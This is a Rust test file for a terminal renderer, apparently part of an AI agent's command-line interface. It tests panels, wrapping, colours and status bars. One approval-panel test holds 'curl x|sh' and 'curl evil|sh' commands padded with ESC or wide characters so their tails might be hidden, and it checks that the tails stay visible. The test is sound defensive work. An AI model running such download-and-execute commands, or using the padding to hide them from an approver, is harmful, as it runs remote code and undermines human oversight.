use super::*;
use ratatui::backend::TestBackend;

#[test]
fn picker_window_keeps_the_selection_visible() {
    assert_eq!(picker_window(2, 1, 3), (0, 2), "a short list shows whole");
    assert_eq!(picker_window(5, 0, 3), (0, 3));
    assert_eq!(picker_window(5, 2, 3), (0, 3), "no scroll while in view");
    assert_eq!(picker_window(5, 3, 3), (1, 4), "the window follows down");
    assert_eq!(picker_window(5, 4, 3), (2, 5));
}

#[test]
fn draw_picker_panel_shows_the_window_and_marks_the_selection() {
    let mut renderer = test_renderer(
        60,
        10,
        VIEWPORT_ROWS,
        crate::cli::palette::ColorDepth::Xterm256,
    );
    let status = default_status();
    let rows: Vec<String> = (0..5).map(|i| format!("s{i}  host:local")).collect();
    renderer
        .draw_picker_panel("agents · 4/5", &rows, 3, &status)
        .unwrap();
    let buf = renderer.terminal.backend().buffer().clone();
    let line = |y: u16| -> String {
        (0..buf.area.width)
            .map(|x| buf[(x, y)].symbol().to_string())
            .collect()
    };
    let text: Vec<String> = (0..buf.area.height).map(line).collect();
    let all = text.join("\n");
    assert!(all.contains("agents · 4/5"), "{all}");
    assert!(
        all.contains("› s3  host:local"),
        "the selection is marked: {all}"
    );
    assert!(all.contains("  s1  host:local"), "{all}");
    assert!(
        !all.contains("s0  host"),
        "row 0 scrolled out of the window: {all}"
    );
    let marked = text.iter().position(|l| l.contains("› s3")).unwrap() as u16;
    let x = text[marked as usize].find('›').unwrap() as u16;
    assert!(
        buf[(x, marked)].modifier.contains(Modifier::REVERSED),
        "the selected row is drawn reversed"
    );
}

pub(super) fn make_test_renderer() -> RatatuiRenderer<TestBackend> {
    test_renderer(
        60,
        10,
        VIEWPORT_ROWS,
        crate::cli::palette::ColorDepth::Truecolor,
    )
}

/// A renderer over a `cols`×`rows` test backend with an inline viewport of
/// `viewport` rows, drawing in `depth` colours. Every other field starts as
/// a fresh renderer's does.
pub(super) fn test_renderer(
    cols: u16,
    rows: u16,
    viewport: u16,
    depth: crate::cli::palette::ColorDepth,
) -> RatatuiRenderer<TestBackend> {
    let terminal = Terminal::with_options(
        TestBackend::new(cols, rows),
        ratatui::TerminalOptions {
            viewport: ratatui::Viewport::Inline(viewport),
        },
    )
    .unwrap();
    RatatuiRenderer {
        terminal,
        palette: crate::cli::palette::Palette::for_depth(depth),
        origin_row: 0,
        inserted_rows: 0,
        rows_scrolled: 0,
        history: std::collections::VecDeque::new(),
        last_width: 0,
        last_height: 0,
        guard: None,
    }
}

#[test]
fn live_region_shows_input_text_and_status_bar() {
    let mut renderer = make_test_renderer();

    let mut input = InputLine::new();
    input.insert('H');
    input.insert('e');
    input.insert('l');
    input.insert('l');
    input.insert('o');

    let status = default_status();

    renderer.draw(&input, &status).unwrap();

    let buf = renderer.terminal.backend().buffer();
    let all_text: String = buf
        .content
        .iter()
        .flat_map(|c| c.symbol().chars())
        .collect();
    // The status bar shows the model slot; a 60-column pane drops the
    // tier-3 session slot, so only the model is pinned here.
    assert!(
        all_text.contains("test-model"),
        "status bar should contain model name, got: {}",
        all_text
    );
    // Input box top rule should be present (the box has no corners or side
    // borders: they became blank paste-safe columns).
    assert!(
        all_text.contains('─'),
        "input box top rule should be present, got: {}",
        all_text
    );
    // Input text should be rendered.
    assert!(
        all_text.contains("Hello"),
        "input box should contain 'Hello', got: {}",
        all_text
    );
}

/// M32 #18: the spinner's input box holds the text typed mid-turn instead of
/// today's empty one.
#[test]
fn spinner_draws_the_typeahead_in_the_input_box() {
    use super::layout_tests::{corner_row, row_text};

    let mut renderer = make_test_renderer();

    let status = default_status();

    renderer
        .draw_spinner("(◉)", "scrying", 3, "queued text", &status)
        .unwrap();

    let buf = renderer.terminal.backend().buffer();
    let corner = corner_row(buf);

    // The text is inside the box: the row below the top border shows it.
    let text_row = row_text(buf, corner + 1);
    assert!(
        text_row.contains("queued text"),
        "the input box row should show the typeahead, got: {text_row:?}"
    );

    // And it is not the spinner row above the box.
    let spinner_row = row_text(buf, corner - 1);
    assert!(
        !spinner_row.contains("queued text"),
        "the typeahead must not leak into the spinner row, got: {spinner_row:?}"
    );
}

#[test]
fn commit_renders_transcript_line_into_buffer() {
    let mut renderer = make_test_renderer();

    // First draw the live region so the viewport has content.
    let input = InputLine::new();
    let status = approval_test_status();
    renderer.draw(&input, &status).unwrap();

    // Commit a line.
    renderer.commit("Hello from transcript").unwrap();
    let backend = renderer.terminal.backend();
    // After insert_before, the committed line should be in the buffer or scrollback.
    let buf = backend.buffer();
    let scroll = backend.scrollback();
    let buf_text: String = buf
        .content
        .iter()
        .flat_map(|c| c.symbol().chars())
        .collect();
    let scroll_text: String = scroll
        .content
        .iter()
        .flat_map(|c| c.symbol().chars())
        .collect();
    assert!(
        buf_text.contains("Hello from transcript") || scroll_text.contains("Hello from transcript"),
        "committed line should appear in buffer or scrollback. buf: {} scroll: {}",
        buf_text,
        scroll_text,
    );
}

#[test]
fn commit_styled_renders_into_buffer_without_escapes() {
    let mut renderer = make_test_renderer();

    // First draw the live region so the viewport has content.
    let input = InputLine::new();
    let status = approval_test_status();
    renderer.draw(&input, &status).unwrap();

    // Commit styled lines.
    let lines: Vec<Line<'static>> = vec![Line::from(vec![
        Span::styled("Styled ", Style::default().add_modifier(Modifier::BOLD)),
        Span::styled("text", Style::default().fg(Color::Yellow)),
    ])];
    renderer.commit_styled(&lines).unwrap();

    let backend = renderer.terminal.backend();
    let buf = backend.buffer();
    let scroll = backend.scrollback();

    // Check that the text is present in the buffer or scrollback.
    let buf_text: String = buf
        .content
        .iter()
        .flat_map(|c| c.symbol().chars())
        .collect();
    let scroll_text: String = scroll
        .content
        .iter()
        .flat_map(|c| c.symbol().chars())
        .collect();
    assert!(
        buf_text.contains("Styled text") || scroll_text.contains("Styled text"),
        "styled text should appear in buffer or scrollback. buf: {} scroll: {}",
        buf_text,
        scroll_text,
    );

    // Verify no raw ANSI escape bytes in committed cells.
    let all_symbols: Vec<&str> = buf
        .content
        .iter()
        .map(|c| c.symbol())
        .chain(scroll.content.iter().map(|c| c.symbol()))
        .collect();
    for sym in &all_symbols {
        assert!(
            !sym.contains('\x1b'),
            "cell content should not contain raw ANSI escape byte: {:?}",
            sym,
        );
    }
}

#[test]
fn parse_ansi_to_spans_converts_simple_sgr() {
    let spans = parse_ansi_to_spans("hello \x1b[1mworld\x1b[0m");
    assert_eq!(spans.len(), 2);
    assert_eq!(spans[0].content.as_ref(), "hello ");
    assert!(spans[1].style.add_modifier(Modifier::BOLD) == spans[1].style);
    assert_eq!(spans[1].content.as_ref(), "world");
}

#[test]
fn parse_ansi_to_spans_handles_color() {
    let spans = parse_ansi_to_spans("\x1b[33myellow\x1b[0m text");
    assert_eq!(spans.len(), 2);
    assert_eq!(spans[0].content.as_ref(), "yellow");
    assert_eq!(spans[0].style.fg, Some(Color::Yellow));
}

#[test]
fn apply_sgr_parses_truecolor_foreground() {
    let spans = parse_ansi_to_spans("\x1b[38;2;220;160;0mX");
    assert_eq!(spans.len(), 1);
    assert_eq!(spans[0].content.as_ref(), "X");
    assert_eq!(spans[0].style.fg, Some(Color::Rgb(220, 160, 0)));
}

/// Test that the full streaming path — `MarkdownRenderer::feed_to_lines`
/// producing styled lines committed via `commit_styled` — renders text into
/// the TestBackend buffer/scrollback with no raw `\x1b` escape bytes.
#[test]
fn streaming_tokens_appear_in_scrollback_without_escapes() {
    let mut renderer = make_test_renderer();

    // Draw the live region first.
    let input = InputLine::new();
    let status = approval_test_status();
    renderer.draw(&input, &status).unwrap();

    // Simulate streaming tokens through the markdown renderer.
    let mut md = crate::cli::markdown::MarkdownRenderer::new();
    let width = 58; // match test backend width minus borders

    // Feed tokens that span a line boundary.
    let lines1 = md.feed_to_lines("Hello ", width);
    let lines2 = md.feed_to_lines("world\n", width);
    let all_lines: Vec<Line<'static>> = lines1.into_iter().chain(lines2).collect();

    if !all_lines.is_empty() {
        renderer.commit_styled(&all_lines).unwrap();
    }

    // Feed a second line with markdown styling (bold).
    let lines3 = md.feed_to_lines("**bold** ", width);
    let lines4 = md.feed_to_lines("text\n", width);
    let all_lines2: Vec<Line<'static>> = lines3.into_iter().chain(lines4).collect();

    if !all_lines2.is_empty() {
        renderer.commit_styled(&all_lines2).unwrap();
    }

    // Flush any remaining partial line.
    let remaining = md.flush_to_lines(width);
    if !remaining.is_empty() {
        renderer.commit_styled(&remaining).unwrap();
    }

    let backend = renderer.terminal.backend();
    let buf = backend.buffer();
    let scroll = backend.scrollback();

    let buf_text: String = buf
        .content
        .iter()
        .flat_map(|c| c.symbol().chars())
        .collect();
    let scroll_text: String = scroll
        .content
        .iter()
        .flat_map(|c| c.symbol().chars())
        .collect();

    // The committed text should be present.
    assert!(
        buf_text.contains("Hello world") || scroll_text.contains("Hello world"),
        "streamed text should appear in buffer or scrollback. buf: {} scroll: {}",
        buf_text,
        scroll_text,
    );

    // No raw ANSI escape bytes in any cell.
    let all_symbols: Vec<&str> = buf
        .content
        .iter()
        .map(|c| c.symbol())
        .chain(scroll.content.iter().map(|c| c.symbol()))
        .collect();
    for sym in &all_symbols {
        assert!(
            !sym.contains('\x1b'),
            "cell content should not contain raw ANSI escape byte: {:?}",
            sym,
        );
    }
}

/// Test that `feed_to_lines` correctly buffers partial lines and only
/// emits on newline boundaries.
#[test]
fn feed_to_lines_buffers_partial_lines() {
    let mut md = crate::cli::markdown::MarkdownRenderer::new();
    let width = 60;

    // Feed a partial line — no newline yet.
    let lines = md.feed_to_lines("partial", width);
    assert!(lines.is_empty(), "no complete line yet, got {:?}", lines);

    // Complete the line with a newline.
    let lines = md.feed_to_lines(" line\n", width);
    assert!(!lines.is_empty(), "should have one complete line");

    // Feed another partial line.
    let lines = md.feed_to_lines("second", width);
    assert!(lines.is_empty(), "no complete line yet");

    // Flush the final partial line.
    let lines = md.flush_to_lines(width);
    assert!(!lines.is_empty(), "flush should produce the final line");
}

/// Test that `feed_to_lines` handles empty lines (bare newlines).
#[test]
fn feed_to_lines_handles_empty_lines() {
    let mut md = crate::cli::markdown::MarkdownRenderer::new();
    let width = 60;

    let lines = md.feed_to_lines("first\n\nsecond\n", width);
    // Should produce 3 lines: "first", empty, "second"
    assert_eq!(
        lines.len(),
        3,
        "expected 3 lines for 'first\\n\\nsecond\\n'"
    );
}

/// Test that wrapped multi-line input appears across the input box rows
/// in the TestBackend buffer.
#[test]
fn wrapped_multiline_input_renders_across_rows() {
    let mut renderer = make_test_renderer();

    let mut input = InputLine::new();
    input.insert_str("the quick brown fox jumps over the lazy dog and continues");

    let status = default_status();

    renderer.draw(&input, &status).unwrap();

    let buf = renderer.terminal.backend().buffer();
    let all_text: String = buf
        .content
        .iter()
        .flat_map(|c| c.symbol().chars())
        .collect();

    // The input text should be rendered (wrapped across rows)
    assert!(
        all_text.contains("the quick"),
        "input should contain 'the quick', got: {}",
        all_text
    );
    assert!(
        all_text.contains("brown fox"),
        "input should contain 'brown fox', got: {}",
        all_text
    );
}

/// Test that a multi-line buffer with embedded newlines renders correctly
/// and the cursor position is placed.
#[test]
fn multiline_buffer_renders_with_cursor() {
    let mut renderer = make_test_renderer();

    let mut input = InputLine::new();
    input.insert_str("line one\nline two");

    let status = default_status();

    renderer.draw(&input, &status).unwrap();

    let buf = renderer.terminal.backend().buffer();
    let all_text: String = buf
        .content
        .iter()
        .flat_map(|c| c.symbol().chars())
        .collect();

    // Both lines should be rendered
    assert!(
        all_text.contains("line one"),
        "should contain 'line one', got: {}",
        all_text
    );
    assert!(
        all_text.contains("line two"),
        "should contain 'line two', got: {}",
        all_text
    );
}

/// Test that a body taller than the visible content area scrolls internally
/// so the cursor row stays visible.
#[test]
fn tall_body_scrolls_cursor_into_view() {
    let mut renderer = make_test_renderer();

    // Build a body with 10 lines — more than the ~3 visible content rows.
    let mut input = InputLine::new();
    for i in 0..10 {
        if i > 0 {
            input.insert('\n');
        }
        input.insert_str(&format!("line {}", i));
    }

    let status = default_status();

    renderer.draw(&input, &status).unwrap();

    let buf = renderer.terminal.backend().buffer();
    let all_text: String = buf
        .content
        .iter()
        .flat_map(|c| c.symbol().chars())
        .collect();

    // The last line (where the cursor is) should be visible.
    assert!(
        all_text.contains("line 9"),
        "cursor line 'line 9' should be visible after scroll, got: {}",
        all_text
    );
}
/// Test that `commit_panel` renders with blood-red borders and deep-yellow title.
#[test]
fn commit_panel_uses_blood_red_border_and_yellow_title() {
    let mut renderer = make_test_renderer();

    // Draw the live region first so the viewport is active.
    let input = InputLine::new();
    let status = approval_test_status();
    renderer.draw(&input, &status).unwrap();

    // Commit a panel with a known title.
    renderer
        .commit_panel("Output", &["some output line".to_string()], false)
        .unwrap();

    let backend = renderer.terminal.backend();
    let buf = backend.buffer();
    let scroll = backend.scrollback();

    // Collect all cells from buffer + scrollback.
    let all_cells: Vec<_> = buf.content.iter().chain(scroll.content.iter()).collect();

    // Find the panel's border cells. With the `scrolling-regions` feature
    // the live input box (a gray-bordered block) is no longer cleared by
    // `insert_before`, so its gray `─` cells coexist with the panel's. We
    // therefore assert that the panel contributes blood-red border cells —
    // its rounded corners are unique to the panel — rather than that *every*
    // border glyph on screen is blood-red.
    let border_color = Color::Rgb(180, 0, 0);
    let panel_corner_glyphs = ["╭", "╮", "╰", "╯"];
    let panel_border_cells: Vec<_> = all_cells
        .iter()
        .filter(|c| panel_corner_glyphs.iter().any(|g| c.symbol() == *g))
        .collect();
    assert!(
        !panel_border_cells.is_empty(),
        "expected panel corner border cells, found none"
    );
    for cell in &panel_border_cells {
        assert_eq!(
            cell.style().fg,
            Some(border_color),
            "panel border cell '{}' should have blood-red fg, got {:?}",
            cell.symbol(),
            cell.style().fg
        );
    }

    // Verify at least some title cells have deep-yellow color.
    let title_color = Color::Rgb(220, 160, 0);
    let yellow_title_cells: Vec<_> = all_cells
        .iter()
        .filter(|c| c.style().fg == Some(title_color))
        .collect();
    assert!(
        !yellow_title_cells.is_empty(),
        "expected some cells with deep-yellow title color, found none"
    );

    // Verify the title text is present.
    let all_text: String = all_cells.iter().flat_map(|c| c.symbol().chars()).collect();
    assert!(
        all_text.contains("Output"),
        "panel title 'Output' should be present, got: {}",
        all_text
    );
}

#[test]
fn commit_panel_borders_follow_palette_depth() {
    let mut renderer = test_renderer(
        80,
        24,
        VIEWPORT_ROWS,
        crate::cli::palette::ColorDepth::Xterm256,
    );

    let input = InputLine::new();
    let status = approval_test_status();
    renderer.draw(&input, &status).unwrap();

    renderer
        .commit_panel("Output", &["some output line".to_string()], false)
        .unwrap();

    let backend = renderer.terminal.backend();
    let buf = backend.buffer();
    let scroll = backend.scrollback();

    let all_cells: Vec<_> = buf.content.iter().chain(scroll.content.iter()).collect();

    // Verify border cells use Indexed(124) for Xterm256 depth.
    let border_color = Color::Indexed(124);
    let panel_corner_glyphs = ["╭", "╮", "╰", "╯"];
    let panel_border_cells: Vec<_> = all_cells
        .iter()
        .filter(|c| panel_corner_glyphs.iter().any(|g| c.symbol() == *g))
        .collect();
    assert!(
        !panel_border_cells.is_empty(),
        "expected panel corner border cells, found none"
    );
    for cell in &panel_border_cells {
        assert_eq!(
            cell.style().fg,
            Some(border_color),
            "panel border cell '{}' should have Indexed(124) fg, got {:?}",
            cell.symbol(),
            cell.style().fg
        );
    }

    // Verify title cells use Indexed(178) for Xterm256 depth.
    let title_color = Color::Indexed(178);
    let yellow_title_cells: Vec<_> = all_cells
        .iter()
        .filter(|c| c.style().fg == Some(title_color))
        .collect();
    assert!(
        !yellow_title_cells.is_empty(),
        "expected title cells with Indexed(178), found none"
    );
}

#[test]
fn commit_panel_wraps_long_body_lines() {
    let mut renderer = test_renderer(
        60,
        10,
        VIEWPORT_ROWS,
        crate::cli::palette::ColorDepth::Truecolor,
    );

    let long_line = "x".repeat(100);
    renderer
        .commit_panel("Output", &[long_line], false)
        .unwrap();

    let backend = renderer.terminal.backend();
    let buf = backend.buffer();
    let scroll = backend.scrollback();
    let all_cells: Vec<_> = buf.content.iter().chain(scroll.content.iter()).collect();

    // No cell should contain the ellipsis character.
    for cell in &all_cells {
        assert!(
            cell.symbol() != "…",
            "body line should be wrapped, not truncated with ellipsis"
        );
    }

    // Group into rows of 60 chars.
    let symbols: Vec<String> = all_cells.iter().map(|c| c.symbol().to_string()).collect();
    let rows: Vec<String> = (0..symbols.len())
        .step_by(60)
        .map(|i| symbols[i..std::cmp::min(i + 60, symbols.len())].join(""))
        .collect();

    let body_rows: Vec<_> = rows.iter().filter(|r| r.contains('x')).collect();
    assert!(
        body_rows.len() >= 2,
        "expected at least 2 body rows for a 100-char line at width 56, got {}",
        body_rows.len()
    );

    // Both body rows should start with 'x' at x = 2 (after "  " padding).
    for row in &body_rows {
        assert!(
            row.chars().nth(2) == Some('x'),
            "body row should start with 'x' at column 2, got: {:?}",
            row
        );
    }
}

#[test]
fn commit_panel_bottom_label_right_justified() {
    let mut renderer = test_renderer(
        60,
        10,
        VIEWPORT_ROWS,
        crate::cli::palette::ColorDepth::Truecolor,
    );

    let body = vec!["short line".to_string()];
    renderer
        .commit_panel_labeled("output", &body, true, Some("✓ 1.2s"))
        .unwrap();

    let backend = renderer.terminal.backend();
    let buf = backend.buffer();
    let scroll = backend.scrollback();
    let all_cells: Vec<_> = buf.content.iter().chain(scroll.content.iter()).collect();

    // Group into rows of 60 cells.
    let rows: Vec<Vec<_>> = (0..all_cells.len())
        .step_by(60)
        .map(|i| all_cells[i..std::cmp::min(i + 60, all_cells.len())].to_vec())
        .collect();

    let bottom_row = rows
        .iter()
        .find(|row| row.iter().any(|c| c.symbol() == "╯"))
        .expect("expected a bottom border row with '╯'");

    let row_text: String = bottom_row.iter().map(|c| c.symbol()).collect();
    assert!(
        row_text.contains("✓ 1.2s"),
        "bottom border should contain label '✓ 1.2s', got: {}",
        row_text
    );
    assert!(
        row_text.ends_with("─╯"),
        "bottom border should end with '─╯', got: {}",
        row_text
    );

    // Label cells should carry the title color (Truecolor → Rgb(220, 160, 0)).
    let title_color = Color::Rgb(220, 160, 0);
    let label_cells: Vec<_> = bottom_row
        .iter()
        .filter(|c| {
            c.symbol() == "✓" || c.symbol() == "1" || c.symbol() == "2" || c.symbol() == "s"
        })
        .collect();
    for cell in &label_cells {
        assert_eq!(
            cell.style().fg,
            Some(title_color),
            "label cell '{}' should have title color Rgb(220, 160, 0), got {:?}",
            cell.symbol(),
            cell.style().fg
        );
    }
}

#[test]
fn commit_panel_without_label_keeps_plain_rule() {
    let mut renderer = test_renderer(
        60,
        10,
        VIEWPORT_ROWS,
        crate::cli::palette::ColorDepth::Truecolor,
    );

    let body = vec!["short".to_string()];
    renderer.commit_panel("Output", &body, false).unwrap();

    let backend = renderer.terminal.backend();
    let buf = backend.buffer();
    let scroll = backend.scrollback();
    let all_cells: Vec<_> = buf.content.iter().chain(scroll.content.iter()).collect();

    // Group into rows of 60 cells.
    let rows: Vec<Vec<_>> = (0..all_cells.len())
        .step_by(60)
        .map(|i| all_cells[i..std::cmp::min(i + 60, all_cells.len())].to_vec())
        .collect();

    let bottom_row = rows
        .iter()
        .find(|row| row.iter().any(|c| c.symbol() == "╯"))
        .expect("expected a bottom border row with '╯'");

    let row_text: String = bottom_row.iter().map(|c| c.symbol()).collect();
    let expected = format!("╰{}╯", "─".repeat(58));
    assert_eq!(
        row_text, expected,
        "bottom border without label should be plain rule, got: {}",
        row_text
    );
}

#[test]
fn truncate_with_ellipsis_leaves_short_string_unchanged() {
    assert_eq!(truncate_with_ellipsis("hello", 10), "hello");
    assert_eq!(truncate_with_ellipsis("hello", 5), "hello");
    assert!(!truncate_with_ellipsis("hello", 10).contains('…'));
    assert!(!truncate_with_ellipsis("hello", 5).contains('…'));
}

#[test]
fn truncate_with_ellipsis_marks_overflow() {
    let result = truncate_with_ellipsis("hello world", 8);
    assert_eq!(Span::raw(&result).width(), 8, "clipped to the width");
    assert!(result.ends_with('…'));
    assert_eq!(result, "hello w…");
}

#[test]
fn truncate_with_ellipsis_zero_max_is_empty() {
    assert_eq!(truncate_with_ellipsis("hello", 0), "");
}

/// A panel's border rows are as wide as the terminal even when the title
/// or the bottom label holds double-width characters.
#[test]
fn commit_panel_borders_fill_by_display_width() {
    let mut renderer = make_test_renderer();
    renderer
        .commit_panel_labeled("漢字 title", &["body".to_string()], false, Some("ラベル"))
        .unwrap();
    let rows: Vec<&Line<'static>> = renderer.history.iter().collect();
    let top = rows[0];
    let bottom = rows[rows.len() - 2];
    assert_eq!(top.width(), 60, "top border: {top:?}");
    assert_eq!(bottom.width(), 60, "bottom border: {bottom:?}");
}

/// Helper: make a default status model for tests.
pub(super) fn default_status() -> crate::cli::status_bar::StatusModel {
    crate::cli::status_bar::StatusModel {
        session_name: Some("abcdef12-3456".to_string()),
        model: "test-model".to_string(),
        context_window: 200_000,
        ..Default::default()
    }
}

/// Build the default test status model.
pub(super) fn approval_test_status() -> crate::cli::status_bar::StatusModel {
    crate::cli::status_bar::StatusModel {
        model: "test-model".to_string(),
        context_window: 200_000,
        ..Default::default()
    }
}

// ── Phase 02 (M36): the status bar's line builder ───────────────────────────

#[test]
fn status_bar_shows_turn_on_every_panel() {
    for draw in 0..6 {
        let mut renderer = make_test_renderer();
        let mut input = InputLine::new();
        input.insert_str("typed");
        let status = crate::cli::status_bar::StatusModel {
            turn: 6,
            ..approval_test_status()
        };
        match draw {
            0 => renderer.draw(&input, &status).unwrap(),
            1 => renderer
                .draw_spinner("(◉)", "scrying", 3, "", &status)
                .unwrap(),
            2 => renderer.draw_prompt("password:", &input, &status).unwrap(),
            3 => renderer
                .draw_approval_panel("approve command", "session", &input, &status)
                .unwrap(),
            4 => renderer
                .draw_credential_panel("sudo password", "[sudo] password required", &input, &status)
                .unwrap(),
            5 => renderer
                .draw_picker_panel("agents · 1/1", &["s0  host:local".to_string()], 0, &status)
                .unwrap(),
            _ => unreachable!(),
        }
        let buf = renderer.terminal.backend().buffer();
        let all_text: String = buf
            .content
            .iter()
            .flat_map(|c| c.symbol().chars())
            .collect();
        assert!(
            all_text.contains("↻6") || all_text.contains("t6"),
            "draw path {draw} must put the turn 6 on its status row: {all_text:?}"
        );
    }
}

/// S1 (M36 phase-05a): the approval panel must show the end of the command
/// it asks the user to approve. `wrap_display` measures display columns and
/// shows control characters as visible text, so a 36-CJK command and an
/// ESC-padded command both keep their tails on screen on an 80-column
/// backend.
#[test]
fn wrap_display_approval_panel_shows_the_whole_command() {
    for (command, tail) in [
        ("echo ok \x1b          ; curl x|sh", "curl x|sh"),
        (
            "echo 漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢漢; curl evil|sh",
            "curl evil|sh",
        ),
    ] {
        let mut renderer = test_renderer(
            80,
            24,
            VIEWPORT_ROWS,
            crate::cli::palette::ColorDepth::Truecolor,
        );
        let status = approval_test_status();
        renderer.draw(&InputLine::new(), &status).unwrap();
        renderer
            .commit_panel_labeled("approve", &[command.to_string()], false, None)
            .unwrap();

        let backend = renderer.terminal.backend();
        let buf = backend.buffer().clone();
        let scroll = backend.scrollback().clone();
        let all_cells: Vec<_> = buf.content.iter().chain(scroll.content.iter()).collect();
        let all_text: String = all_cells.iter().flat_map(|c| c.symbol().chars()).collect();
        assert!(
            all_text.contains(tail),
            "the command's tail `{tail}` must be on screen, got: {all_text:?}"
        );
        assert!(
            !all_text.contains('\x1b'),
            "no raw ESC may reach the screen: {all_text:?}"
        );
    }
}

/// The panel's committed rows are each at most the terminal's width — the
/// wrapper's rows never overflow the `Paragraph`.
#[test]
fn wrap_display_approval_panel_rows_fit_the_terminal() {
    let mut renderer = test_renderer(
        80,
        24,
        VIEWPORT_ROWS,
        crate::cli::palette::ColorDepth::Truecolor,
    );
    let status = approval_test_status();
    renderer.draw(&InputLine::new(), &status).unwrap();
    renderer
        .commit_panel_labeled("approve", &["漢".repeat(36), "x".repeat(200)], false, None)
        .unwrap();
    for row in renderer.history.iter() {
        assert!(
            row.width() <= 80,
            "committed row wider than the 80-column terminal: {row:?}"
        );
    }
}

// ── approval_diff (M36 phase-06, B7) ─────────────────────────────────────────

use crate::cli::diff::render_diff;

/// The rows the write/edit prompts commit for a diff, at the renderer's
/// width: `wrap_line` split, `commit_styled` pushed — the phase's commit
/// path, so the test exercises exactly what the prompt does.
fn commit_diff_rows(
    renderer: &mut RatatuiRenderer<TestBackend>,
    view: &crate::cli::diff::DiffView,
) {
    let width = renderer.width();
    let rows: Vec<Line<'static>> = view
        .rows
        .iter()
        .flat_map(|line| crate::cli::render::wrap_line(line.clone(), width))
        .collect();
    let _ = renderer.commit_styled(&rows);
}

/// A 200-char `+` line committed at width 80 fills more than one row of the
/// renderer's history, every row is green, none holds `…`, and the rows' text
/// joins back to the line.
#[test]
fn approval_diff_long_line_wraps_at_commit() {
    let mut renderer = test_renderer(
        80,
        24,
        VIEWPORT_ROWS,
        crate::cli::palette::ColorDepth::Truecolor,
    );
    let status = approval_test_status();
    renderer.draw(&InputLine::new(), &status).unwrap();

    let long = "x".repeat(200);
    let view = render_diff("big.sh", None, &format!("{long}\n"));
    assert_eq!(view.rows.len(), 2, "header plus one content row");
    commit_diff_rows(&mut renderer, &view);

    let rows: Vec<Line<'static>> = renderer.history.iter().cloned().collect();
    // The prompt's two-space indent plus the row's own text.
    let body: Vec<String> = rows[1..]
        .iter()
        .map(|r| {
            let text: String = r.spans.iter().map(|s| s.content.as_ref()).collect();
            text.trim_start_matches("  ").to_string()
        })
        .collect();
    let joined: String = body
        .iter()
        .map(|r| r.strip_prefix('+').unwrap_or(r))
        .collect::<Vec<_>>()
        .concat();
    assert_eq!(
        joined, long,
        "the rows' text joins back to the line: {joined:?}"
    );
    assert!(
        body.len() > 1,
        "a 200-char line fills more than one history row: {body:?}"
    );
    assert!(
        body.iter().all(|r| !r.contains('…')),
        "no row is truncated with an ellipsis: {body:?}"
    );
    for row in &body {
        assert!(
            !row.contains("[32m") && !row.contains('\x1b'),
            "a row holds SGR text: {row:?}"
        );
    }
}

#[test]
fn renderer_draws_the_status_bar_from_the_model() {
    let mut renderer = make_test_renderer();
    let input = InputLine::new();
    let status = crate::cli::status_bar::StatusModel {
        model: "test-model".to_string(),
        turn: 3,
        session_name: Some("incident-42".to_string()),
        ..approval_test_status()
    };
    renderer.draw(&input, &status).unwrap();
    let buf = renderer.terminal.backend().buffer();
    let all_text: String = buf
        .content
        .iter()
        .flat_map(|c| c.symbol().chars())
        .collect();
    // The bar is the model's glyph-led line: the turn segment shows.
    assert!(
        all_text.contains('↻') && all_text.contains('3'),
        "the bar row shows the turn segment: {all_text:?}"
    );
    // The old bar's session id and uptime labels are gone.
    assert!(
        !all_text.contains("session:") && !all_text.contains("up "),
        "no legacy session:/up labels: {all_text:?}"
    );
}
